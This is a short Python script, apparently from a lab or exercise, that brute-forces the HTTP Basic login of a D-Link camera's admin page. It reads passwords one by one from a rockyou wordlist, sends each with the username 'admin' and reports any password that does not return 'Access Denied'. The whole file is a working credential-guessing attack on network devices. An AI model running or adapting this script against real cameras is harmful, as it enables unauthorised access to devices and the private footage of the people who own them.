import requests
import base64
with open("rockyou-20.txt","r") as pwdfile:
    pwd = pwdfile.readline().rstrip()
    while pwd:
        pwd_encoded = f"admin:{pwd}".encode()
        headers = {"Authorization": f"Basic {base64.b64encode(pwd_encoded).decode()}"}
        ret = requests.get("http://dlinkcam/admin",
                        headers=headers)
        
        if ret.text != "Access Denied":
            print(f"Password found {pwd}")
        pwd = pwdfile.readline().rstrip()
